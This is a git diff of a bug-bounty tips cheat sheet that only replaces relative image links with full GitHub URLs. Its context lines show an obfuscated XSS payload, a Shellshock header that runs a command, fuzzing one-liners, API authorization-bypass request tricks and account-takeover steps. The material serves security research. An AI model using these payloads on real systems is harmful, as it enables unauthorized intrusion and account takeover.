@@ -86,7 +86,7 @@ location.hash=null
 <svg onload='new Function'["_Y000!_"].find(al\u0065rt)''>
 ```
 ### IOS Mind map
-![mindmap](img/ios-mindmap.jpg)
+![mindmap](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/ios-mindmap.jpg)
 
 ### Github dorks
 - https://github.com/techgaun/github-dorks
@@ -233,16 +233,16 @@ chaos -d abc.com -bbq -filter-wildcard -http-url | xargs =l@-P5 sh -c 'gospider 
 ```
 ---
 **Auth-Bypass**
-![Auth-bypass](img/auth_bypass.png)
+![Auth-bypass](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/auth_bypass.png)
 **Bash-Injection**
 ```js
 User-Agent:() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;
 Pragme: no-cache
 ```
 **Graphql Manipulation**
-![img](img/graphql-1.jpg)
+![img](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/graphql-1.jpg)
 **Response Splitting**
-![response-split](img/reponse-splitting.jpg)
+![response-split](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/reponse-splitting.jpg)
 #### Tricks from OFJAAAH
 ```sh
 assetfinder http://att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
@@ -309,7 +309,7 @@ total 12
 ./run.tar: line 3: 0000666000175000017500000000000013735317463011661: command not found
 ```
 ###### For Better Look
-![RCE](img/RCE.png)
+![RCE](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/RCE.png)
 ### Looking for an easy way to open arbitrary URLs in Android apps?
 1. Download jadx decompiler and install adb
 2. Open AndroidManifest.xml
@@ -348,7 +348,7 @@ total 12
 4. Search your Burp History for the token you copied from reset token email
 5. If you got the token in Burpsuite history then you got yourself a Account Takeover.
 **Tip 2**
-![ACTR](img/acto.png)
+![ACTR](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/acto.png)
 ### API Bypass Tips
 ```js
 {"id":111}  ====> 401 unauthorized
@@ -365,7 +365,7 @@ GET /api_v1/messages?User_id=victim_id  ====> 401
 GET /api_vi/messages?user_id=attacker&user_id=victim  ====> 200
 ```
 ---
-![file-access](img/arbitrary_location.jpg)
+![file-access](https://github.com/thevillagehacker/Bug-Hunting/blob/master/Writeups/Bug-Bounty-Tips/img/arbitrary_location.jpg)
 
 ---
 ### SSRF to access AWS MetaData
